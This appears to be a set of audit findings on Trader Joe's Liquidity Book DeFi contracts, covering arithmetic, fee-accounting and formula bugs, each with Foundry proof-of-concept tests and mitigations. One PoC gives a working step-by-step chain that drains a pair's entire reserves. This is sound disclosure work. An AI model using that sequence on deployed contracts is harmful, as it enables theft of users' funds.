resolved. --- ### testMultiBinGrowth - Generates datapoints used in opening graph. 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521   # Vulnerability details  ## Impact When calling the `swapAVAXForExactTokens`  function, `if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)` is executed, which is for refunding any excess amount sent in; this is confirmed by this function's comment as well. However, executing `amountsIn[0] - msg.value` will always revert when `msg.value > amountsIn[0]` is true. Developers who has the design of the `swapAVAXForExactTokens` function in mind could develop front-ends and contracts that will send excess amount when calling the `swapAVAXForExactTokens` function. Hence, the users, who rely on these front-ends and contracts for interacting with the `swapAVAXForExactTokens` function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521 ```solidity     /// @notice Swaps AVAX for exact tokens while performing safety checks     /// @dev will refund any excess sent     ...     function swapAVAXForExactTokens(         uint256 _amountOut,         uint256[] memory _pairBinSteps,         IERC20[] memory _tokenPath,         address _to,         uint256 _deadline     )         external         payable         override         ensure(_deadline)         verifyInputs(_pairBinSteps, _tokenPath)         returns (uint256[] memory amountsIn)     {         ...          if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);     } ```  ## Proof of Concept Please add the following test in `test\LBRouter.Swaps.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testSwapAVAXForExactTokensIsUnableToRefund() public {         uint256 amountOut = 1e18;          (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);          IERC20[] memory tokenList = new IERC20[](2);         tokenList[0] = wavax;         tokenList[1] = token6D;         uint256[] memory pairVersions = new uint256[](1);         pairVersions[0] = DEFAULT_BIN_STEP;          vm.deal(DEV, amountIn + 500);          // Although the swapAVAXForExactTokens function supposes to refund any excess sent,         //   calling it reverts when sending more than amountIn         //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow         vm.expectRevert(stdError.arithmeticError);         router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520 can be updated to the following code. ```solidity         if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, msg.value - amountsIn[0]); ```
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202   # Vulnerability details  ## Description  Similar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:  ```     function _getPendingFees(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private view returns (uint256 amountX, uint256 amountY) {         Debts memory _debts = _accruedDebts[_account][_id];          amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;         amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;     } ```  accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.  When liquidity is first minted to user, the \_accruedDebts is updated to match current \_balance * accToken\*PerShare. Without this step, user could collect fees for the entire growth of accToken\*PerShare from zero to current value. This is done in \_updateUserDebts, called by \_cacheFees() which is called by \_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.  ```     function _updateUserDebts(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private {         uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);         uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);          _accruedDebts[_account][_id].debtX = _debtX;         _accruedDebts[_account][_id].debtY = _debtY;     } ```  The critical problem lies in \_beforeTokenTransfer:  ``` if (_from != _to) {     if (_from != address(0) && _from != address(this)) {         uint256 _balanceFrom = balanceOf(_from, _id);         _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);     }     if (_to != address(0) && _to != address(this)) {         uint256 _balanceTo = balanceOf(_to, _id);         _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);     } } ```  Note that if \_from or \_to is the LBPair contract itself, \_cacheFees won't be called on \_from or \_to respectively. This was presumably done because it is not expected that the LBToken address will receive any fees. It is expected that the LBToken will only hold tokens when user sends LP tokens to burn.   This is where the bug manifests - the LBToken address (and 0 address), will collect freshly minted LP token's fees from 0 to current accToken\*PerShare value.  We can exploit this bug to collect the entire reserve assets. The attack flow is: - Transfer amount X to pair - Call pair.mint(), with the to address = pair address - call collectFees() with pair address as account -> pair will send to itself the fees! It is interesting that both OZ ERC20 implementation and LBToken implementation allow this, otherwise this exploit chain would not work - Pair will now think user sent in money, because the bookkeeping is wrong. \_pairInformation.feesX.total is decremented in collectFees(), but the balance did not change. Therefore, this calculation will credit attacker with the fees collected into the pool: ``` uint256 _amountIn = _swapForY     ? tokenX.received(_pair.reserveX, _pair.feesX.total)     : tokenY.received(_pair.reserveY, _pair.feesY.total); ``` - Attacker calls swap() and receives reserve assets using the fees collected. - Attacker calls burn(), passing their own address in \_to parameter. This will successfully burn the minted tokens from step 1 and give Attacker their deposited assets.  Note that if the contract did not have the entire collectFees code in an unchecked block, the loss would be limited to the total fees accrued: ``` if (amountX != 0) {     _pairInformation.feesX.total -= uint128(amountX); } if (amountY != 0) {     _pairInformation.feesY.total -= uint128(amountY); } ```  If attacker would try to overflow the feesX/feesY totals, the call would revert. Unfortunately, because of the unchecked block feesX/feesY would overflow and therefore there would be no problem for attacker to take the entire reserves.  ## Impact  Attacker can steal the entire reserves of the LBPair.  ## Proof of Concept  Paste this test in LBPair.Fees.t.sol:  ```     function testAttackerStealsReserve() public {         uint256 amountY=  53333333333333331968;         uint256 amountX = 100000;          uint256 amountYInLiquidity = 100e18;         uint256 totalFeesFromGetSwapX;         uint256 totalFeesFromGetSwapY;          addLiquidity(amountYInLiquidity, ID_ONE, 5, 0);         uint256 id;         (,,id ) = pair.getReservesAndId();         console.log("id before" , id);          //swap X -> Y and accrue X fees         (uint256 amountXInForSwap, uint256 feesXFromGetSwap) = router.getSwapIn(pair, amountY, true);         totalFeesFromGetSwapX += feesXFromGetSwap;          token6D.mint(address(pair), amountXInForSwap);         vm.prank(ALICE);         pair.swap(true, DEV);         (uint256 feesXTotal, , uint256 feesXProtocol, ) = pair.getGlobalFees();          (,,id ) = pair.getReservesAndId();         console.log("id after" , id);           console.log("Bob balance:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");          uint256 amount0In = 100e18;          uint256[] memory _ids = new uint256[](1); _ids[0] = uint256(ID_ONE);         uint256[] memory _distributionX = new uint256[](1); _distributionX[0] = uint256(Constants.PRECISION);         uint256[] memory _distributionY = new uint256[](1); _distributionY[0] = uint256(0);          console.log("Minting for BOB:");         console.log(amount0In);         console.log("-------------");          token6D.mint(address(pair), amount0In);         //token18D.mint(address(pair), amount1In);         pair.mint(_ids, _distributionX, _distributionY, address(pair));         uint256[] memory amounts = new uint256[](1);         console.log("***");         for (uint256 i; i < 1; i++) {             amounts[i] = pair.balanceOf(address(pair), _ids[i]);             console.log(amounts[i]);         }         uint256[] memory profit_ids = new uint256[](1); profit_ids[0] = 8388608;         (uint256 profit_X, uint256 profit_Y) = pair.pendingFees(address(pair), profit_ids);         console.log("profit x", profit_X);         console.log("profit y", profit_Y);         pair.collectFees(address(pair), profit_ids);         (uint256 swap_x, uint256 swap_y) = pair.swap(true,BOB);          console.log("swap x", swap_x);         console.log("swap y", swap_y);          console.log("Bob balance after swap:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");          console.log("*****");         pair.burn(_ids, amounts, BOB);           console.log("Bob balance after burn:");         console.log(token6D.balanceOf(BOB));         console.log(token18D.balanceOf(BOB));         console.log("-------------");      } ```   ## Tools Used  Manual audit, foundry  ## Recommended Mitigation Steps  Code should not exempt any address from \_cacheFees(). Even address(0) is important, because attacker can collectFees for the 0 address to overflow the FeesX/FeesY variables, even though the fees are not retrievable for them. 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L725   # Vulnerability details   ## Vulnerable detail  Function `LBRouter._getAmountsIn` is a helper function to return the amounts in with given `amountOut`. This function will check the pair of `_token` and `_tokenNext` is `JoePair` or `LBPair` using `_binStep`. * If `_binStep == 0`, it will be a `JoePair` otherwise it will be an `LBPair`. ```solidity= if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` As we can see when `_binStep == 0` and `_token < _tokenPath[i]` (in another word  we swap through `JoePair` and pair's`token0` is `_token` and `token1` is `_tokenPath[i]`), it will  1. Get the reserve of pair (`reserveIn`, `reserveOut`)  2. Calculate the `_amountIn` by using the formula  ``` amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / (_reserveOut - amountOut_ * 997) + 1 ```  But unfortunately the denominator `_reserveOut - amountOut_ * 997` seem incorrect. It should be `(_reserveOut - amountOut_) * 997`.  We will do some math calculations here to prove the expression above is wrong.   **Input:**  * `_reserveIn (rIn)`: reserve of `_token` in pair  * `_reserveOut (rOut)`: reserve of `_tokenPath[i]` in pair  * `amountOut_`: the amount of `_tokenPath` the user wants to gain    **Output:**  * `rAmountIn`: the actual amount of `_token` we need to transfer to the pair.   **Generate Formula**  Cause `JoePair` [takes 0.3%](https://help.traderjoexyz.com/en/welcome/faq-and-help/general-faq#what-are-trader-swap-joe-fees) of `amountIn` as fee, we get  * `amountInDeductFee = amountIn' * 0.997`  Following the [constant product formula](https://docs.uniswap.org/protocol/V2/concepts/protocol-overview/glossary#constant-product-formula), we have  ```     rIn * rOut = (rIn + amountInDeductFee) * (rOut - amountOut_) ==> rIn + amountInDeductFee = rIn * rOut / (rOut - amountOut_) + 1 <=> amountInDeductFee = (rIn * rOut) / (rOut - amountOut_) - rIn + 1 <=> rAmountIn * 0.997 = rIn * amountOut / (rOut - amountOut_) + 1 <=> rAmountIn = (rIn * amountOut * 1000) / ((rOut - amountOut_) * 997) + 1 <=>  ```  As we can see `rAmountIn` is different from `amountsIn[i - 1]`, the denominator of `rAmountIn` is `(rOut - amountOut_) * 997` when the denominator of `amountsIn[i - 1]` is `_reserveOut - amountOut_ * 997` (Missing one bracket)  ## Impact **Loss of fund: User will send a lot of tokenIn (much more than expected) but just gain exact amountOut in return.**   Let dive in the function `swapTokensForExactTokens()` to figure out why this scenario happens. I will assume I just swap through only one pool from `JoePair` and 0 pool from `LBPair`.  * Firstly function will get the list `amountsIn` from function `_getAmountsIn`. So `amountsIn` will be [`incorrectAmountIn`, `userDesireAmount`].      ```solidity=             // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L440     amountsIn = _getAmountsIn(_pairBinSteps, _pairs, _tokenPath, _amountOut);     ```  * Then it transfers `incorrectAmountIn` to `_pairs[0]` to prepare for the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L444     _tokenPath[0].safeTransferFrom(msg.sender, _pairs[0], amountsIn[0]);     ```   * Finally it calls function `_swapTokensForExactToken` to execute the swap.      ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L446         uint256 _amountOutReal = _swapTokensForExactTokens(_pairs, _pairBinSteps, _tokenPath, amountsIn, _to);     ```     In this step it will reach to [line 841](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841) which will set the expected `amountOut = amountsIn[i+1] = amountsIn[1] = userDesireAmount`.     ```solidity=     // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L841     amountOut = _amountsIn[i + 1];     ```     So after calling `IJoePair(_pair).swap()`, the user just gets exactly `amountOut` and wastes a lot of tokenIn that (s)he transfers to the pool.    ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/huuducst/6e34a7bdf37bb29f4b84d2faead94dc4  You can place this file into `/test` folder and run it using  ```bash= forge test --match-test testBugSwapJoeV1PairWithLBRouter --fork-url https://rpc.ankr.com/avalanche --fork-block-number 21437560 -vv ```  Explanation of test script: (For more detail u can read the comments from test script above) 1. Firstly we get the Joe v1 pair WAVAX/USDC from JoeFactory. 2. At the forked block, price `WAVAX/USDC` was around 15.57. We try to use LBRouter function `swapTokensForExactTokens` to swap 10$ WAVAX (10e18 wei) to 1$ USDC (1e6 wei). But it reverts with the error `LBRouter__MaxAmountInExceeded`. But when we swap directly to JoePair, it swap successfully 10$ AVAX (10e18 wei) to 155$ USDC (155e6 wei). 3. We use LBRouter function `swapTokensForExactTokens` again with very large `amountInMax` to swap 1$ USDC (1e6 wei). It swaps successfully but needs to pay a very large amount WAVAX (much more than price).  ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBRouter._getAmountsIn` as follow ```solidity= // url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L717-L728 if (_binStep == 0) {     (uint256 _reserveIn, uint256 _reserveOut, ) = IJoePair(_pair).getReserves();     if (_token > _tokenPath[i]) {         (_reserveIn, _reserveOut) = (_reserveOut, _reserveIn);     }       uint256 amountOut_ = amountsIn[i];     // Legacy uniswap way of rounding     // Fix here      amountsIn[i - 1] = (_reserveIn * amountOut_ * 1_000) / ((_reserveOut - amountOut_) * 997) + 1; } else {     (amountsIn[i - 1], ) = getSwapIn(ILBPair(_pair), amountsIn[i], ILBPair(_pair).tokenX() == _token); } ``` 
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917   # Vulnerability details  ## Vulnerable detail  Struct `FeeParameters` contains 12 fields as follows:  ```solidity= struct FeeParameters {     // 144 lowest bits in slot      uint16 binStep;     uint16 baseFactor;     uint16 filterPeriod;      uint16 decayPeriod;      uint16 reductionFactor;      uint24 variableFeeControl;     uint16 protocolShare;     uint24 maxVolatilityAccumulated;           // 112 highest bits in slot      uint24 volatilityAccumulated;     uint24 volatilityReference;     uint24 indexRef;     uint40 time;  } ``` Function [`LBPair.setFeeParamters(bytes _packedFeeParamters)`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L788-L790) is used to set the first 8 fields which was stored in 144 lowest bits of `LBPair._feeParameter`'s slot to 144 lowest bits of `_packedFeeParameters` (The layout of `_packedFeeParameters` can be seen [here](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L572-L584)). ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917  /// @notice Internal function to set the fee parameters of the pair /// @param _packedFeeParameters The packed fee parameters function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }      /// [#explain]  it will get 112 highest bits of feeStorageSlot,     ///             and stores it in the 112 lowest bits of _varParameters      uint256 _varParameters          = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS/*=144*/);      /// [#explain]  get 144 lowest bits of packedFeeParameters      ///             and stores it in the 144 lowest bits of _newFeeParameters       uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);      assembly {         // [$audit-high] wrong operation `or` here          //              Mitigate: or(_newFeeParameters, _varParameters << 144)             sstore(_feeParameters.slot, or(_newFeeParameters, _varParameters))     } } ``` As we can see in the implementation of `LBPair._setFeesParametes` above, it gets the 112 highest bits of `_feeStorageSlot` and stores it in the 112 lowest bits of `_varParameter`. Then it gets the 144 lowest bits of `packedFeeParameter` and stores it in the 144 lowest bits of `_newFeeParameters`.   Following the purpose of function `setFeeParameters`, the new `LBPair._feeParameters` should form as follow:  ``` // keep 112 highest bits remain unchanged  // set 144 lowest bits to `_newFeeParameter` [...112 bits...][....144 bits.....] [_varParameters][_newFeeParameters] ``` It will make `feeParameters = _newFeeParameters | (_varParameters << 144)`. But current implementation just stores the `or` value of `_varParameters` and `_newFeeParameter` into `_feeParameters.slot`. It forgot to shift left the `_varParameters` 144 bits before executing `or` operation.   This will make the value of `binStep`, ..., `maxVolatilityAccumulated` incorrect, and also remove the value (make the bit equal to 0) of `volatilityAccumulated`, ..., `time`.  ## Impact * Incorrect fee calculation when executing an action with LBPair (swap, flashLoan, mint) * Break the functionality of LBPair. The user can't swap/mint/flashLoan --> Make all the tokens stuck in the pools   ## Proof of concept  Here is our test script to describe the impacts  * https://gist.github.com/WelToHackerLand/012e44bb85420fb53eb0bbb7f0f13769  You can place this file into `/test` folder and run it using  ```bash= forge test --match-contract High1Test -vv ```  Explanation of test script: 1. First we create a pair with `binStep = DEFAULT_BIN_STEP = 25` 2. We do some actions (add liquidity -> mint -> swap) to increase the value of `volatilityAccumulated` from `0` to `60000` 3. We call function `factory.setFeeParametersOnPair` to set new fee parameters.  4. After that the value of `volatilityAccumulated` changed to value `0` (It should still be unchanged after `factory.setFeeParametersOnPair`)  5. We check the value of `binStep` and it changed from`25` to `60025`      * `binStep` has that value because [line 915](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L915) set `binStep = uint16(volatilityAccumulated) | binStep = 60000 | 25 = 60025`.  6. This change of `binStep` value will break all the functionality of `LBPair` cause `binStep > Constant.BASIS_POINT_MAX = 10000`  --> `Error: BinStepOverflows`    ## Tools Used Foundry    ## Recommended Mitigation Steps Modify function `LBPair._setFeesParaters` as follow:  ```solidity= /// url = https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L905-L917 function _setFeesParameters(bytes32 _packedFeeParameters) internal {     bytes32 _feeStorageSlot;     assembly {         _feeStorageSlot := sload(_feeParameters.slot)     }       uint256 _varParameters = _feeStorageSlot.decode(type(uint112).max, _OFFSET_VARIABLE_FEE_PARAMETERS);     uint256 _newFeeParameters = _packedFeeParameters.decode(type(uint144).max, 0);       assembly {         sstore(_feeParameters.slot, or(_newFeeParameters, shl(144, _varParameters)))     } } ```  
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L891 https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L896   # Vulnerability details  ## Impact Output amount is calculated incorrectly for a Trader Joe V1 pool when swapping tokens across multiple pools and some of the pools in the chain are V1 ones. Calculated amounts will always be smaller than expected ones, which will always affect chained swaps that include V1 pools. ## Proof of Concept [LBRouter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L21) is a high-level contract that serves as the main contract users will interact with. The contract implements a lot of security checks and helper functions that make usage of LBPair contracts easier and more user-friendly. Some examples of such functions: - [swapExactTokensForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L531), which makes chained swaps (i.e. swaps between tokens that don't have a pair) of tokens implementing fee on transfer (i.e. there's fee reduced from every transferred amount); - [swapExactTokensForAVAXSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L561), which is the variation of the above function which takes AVAX as the output token; - [swapExactAVAXForTokensSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L594), which is the variation of the previous function which takes AVA as the input token.  Under the hood, these three functions call [_swapSupportingFeeOnTransferTokens](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L864), which is the function that actually performs swaps. The function supports both Trader Joe V1 and V2 pools: when `_binStep` is 0 (which is never true in V2 pools), it's assumed that the current pool is a V1 one. For V1 pools, the function calculates output amounts based on pools' reserves and balances: ```solidity if (_binStep == 0) {     (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();     if (_token < _tokenNext) {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(0, _amountOut, _recipient, "");     } else {         uint256 _balance = _token.balanceOf(_pair);         uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000);          IJoePair(_pair).swap(_amountOut, 0, _recipient, "");     } } else {     ILBPair(_pair).swap(_tokenNext == ILBPair(_pair).tokenY(), _recipient); } ``` However, these calculations are incorrect. Here's the difference: ```diff @@ -888,12 +888,14 @@ contract LBRouter is ILBRouter {                      (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();                      if (_token < _tokenNext) {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve1 * (_balance - _reserve0) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve0) * 997; +                        uint256 _amountOut = (_reserve1 * amountInWithFee) / (_reserve0 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(0, _amountOut, _recipient, "");                      } else {                          uint256 _balance = _token.balanceOf(_pair); -                        uint256 _amountOut = (_reserve0 * (_balance - _reserve1) * 997) / (_balance * 1_000); +                        uint256 amountInWithFee = (_balance - _reserve1) * 997; +                        uint256 _amountOut = (_reserve0 * amountInWithFee) / (_reserve1 * 1_000 + amountInWithFee);                           IJoePair(_pair).swap(_amountOut, 0, _recipient, "");                      } ```  These calculations are implemented correctly in [JoeLibrary.getAmountOut](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/libraries/JoeLibrary.sol#L30-L41), which is used in [LBQuoter](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L83).  Also it's used in Trader Joe V1 to calculate output amounts in similar functions: - https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/traderjoe/JoeRouter02.sol#L375  ```solidity // test/audit/RouterMath2.t.sol // SPDX-License-Identifier: UNLICENSED  pragma solidity ^0.8.7;  import "../TestHelper.sol";  import "../../src/LBRouter.sol"; import "../../src/interfaces/IJoePair.sol";  contract RouterMath2Test is TestHelper {     IERC20 internal token;     uint256 internal actualAmountOut;      function setUp() public {         token = new ERC20MockDecimals(18);         ERC20MockDecimals(address(token)).mint(address(this), 100e18);          router = new LBRouter(             ILBFactory(address(0x00)),             IJoeFactory(address(this)),             IWAVAX(address(0x02))         );     }      // Imitates V1 factory.     function getPair(address, /*tokenX*/ address /*tokenY*/ ) public view returns (address) {         return address(this);     }      // Imitates V1 pool.     function getReserves() public pure returns (uint112, uint112, uint32) {         return (1e18, 1e18, 0);     }      // Imitates V1 pool.     function balanceOf(address /*acc*/) public pure returns (uint256) {         return 0.0001e18;     }      // Imitates V1 pool.     function swap(uint256 amount0, uint256 amount1, address to, bytes memory data) public {         actualAmountOut = amount0 == 0 ? amount1 : amount0;     }      function testScenario() public {         // Setting up a swap via one V1 pool.         uint256[] memory steps = new uint256[](1);         steps[0] = 0;          IERC20[] memory path = new IERC20[](2);         path[0] = IERC20(address(token));         path[1] = IERC20(address(this));          uint256 amountIn = 0.0001e18;          token.approve(address(router), 1e18);         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(             amountIn, 0, steps, path, address(this), block.timestamp + 1000         );         // This amount was calculated incorrectly.         assertEq(actualAmountOut, 987030000000000000); // Equals to 989970211528238869 when fixed.           address _pair = address(this);         uint256 expectedAmountOut;          // Reproduce the calculations using JoeLibrary.getAmountIn. This piece:         // https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L888-L899         (uint256 _reserve0, uint256 _reserve1, ) = IJoePair(_pair).getReserves();         if (address(token) < address(this)) {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve0, _reserve0, _reserve1);         } else {             uint256 _balance = token.balanceOf(_pair);             expectedAmountOut = JoeLibrary.getAmountOut(_balance - _reserve1, _reserve1, _reserve0);         }          // This is the correct amount.         assertEq(expectedAmountOut, 989970211528238869);          // The wrong amount is smaller than the expected one.         assertEq(expectedAmountOut - actualAmountOut, 2940211528238869);     } } ``` ## Tools Used Manual review. ## Recommended Mitigation Steps Consider using the `JoeLibrary.getAmountOut` function in the `_swapSupportingFeeOnTransferTokens` function of `LBRouter` when computing output amounts for V1 pools.
## Low & QA 1. Missing sanity checks on `to` addresses in `LBRouter.sol` 2. Rug vectors by the owner 3. All tokens send to a pair that are not immediately used can be stolen 4. Potential loss of funds on tokens with big supplies 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens   ### 1. Missing sanity checks on `to` addresses in `LBRouter.sol`  All the public/external functions in `LBRouter.sol` require an address `to` as a parameter to which to send either tokens, LBtokens or ETH. When tokens or LBtokens are sent the protocol should check that if the `to` address is contract then that contract should is able to manage `ERC20/LBTokens`, otherwise funds would be lost.  ### 2. Rug vectors by the owner  A malicious owner can call `setLBPairImplementation()`, `setFeeRecipient()`, `setFlashLoanFee()` , `setFeesParameters()` and `forceDecay()` to advantage himself at expenses of the users.  - `setLBPairImplementation()`: can be used to silently frontun a pair creation by swapping the implementation with a malicious one and stealing potentially any deposit. - `setFeeRecipient()`: can be used to steal all of the protocol fees not yet collected. - `setFlashLoanFee()`: can be used to frontrun a flashloan by increasing the fee, if the flashloan returns the fee based on the callback parameters. - `setFeesParameters()`: can set the protocol fee to the max 25% and gets the funds for himself in combination with `setFeeRecipient()`. - `forceDecay()`: can be used to advantage himself in trades.  As a mitigation add a timelock and make sure the owner is a multisig and not an EOA.  ### 3. All tokens send to a pair that are not immediately used can be stolen  If extra tokens are sent the a pair contract either by mistake or intentionally and they are not used immetiately (calling either `mint()`, `burn()` or `swap()`) they become available for anybody to frontrun and claim by simply calling `mint()` and `burn()`.  ### 4. Potential loss of funds on tokens with big supplies  `swap()` and `mint()` both reverts if either `2^112` or `2^128` tokens are sent to the pair. This would result in the funds being stuck and nobody being able to mint or swap. Submitting as low because the cost of attack is extremely high, but it's good to be aware of it.  ### 5. In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens.  If a pair gets created and after a while one of the tokens gets self-destroyed (maybe because of a bug) then `safeTransfer` would still succeed. It's probably a good idea to check if the contract still exists by checking the bytecode length. 
## Summary  ### Gas Optimizations | |Issue|Instances|Total Gas Saved| |-|:-|:-:|:-:| | [G&#x2011;01] | Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate | 1 | - | | [G&#x2011;02] | State variables can be packed into fewer storage slots | 1 | - | | [G&#x2011;03] | Using `storage` instead of `memory` for structs/arrays saves gas | 11 | 46200 | | [G&#x2011;04] | Avoid contract existence checks by using low level calls | 28 | 2800 | | [G&#x2011;05] | Multiple accesses of a mapping/array should use a local variable cache | 1 | 42 | | [G&#x2011;06] | Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement | 5 | 425 | | [G&#x2011;07] | `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops | 5 | 300 | | [G&#x2011;08] | Optimize names to save gas | 11 | 242 | | [G&#x2011;09] | Use a more recent version of solidity | 37 | - | | [G&#x2011;10] | `>=` costs less gas than `>` | 1 | 3 | | [G&#x2011;11] | Functions guaranteed to revert when called by normal users can be marked `payable` | 20 | 420 |  Total: 121 instances over 11 issues with **50432 gas** saved  Gas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above and its gas values do not include any excluded findings.    ## Gas Optimizations  ### [G&#x2011;01]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/LBPair.sol  68        mapping(address => bytes32) private _unclaimedFees; 69        /// @dev Mapping from account to id to user's accruedDebt. 70:       mapping(address => mapping(uint256 => Debts)) private _accruedDebts;  ``` 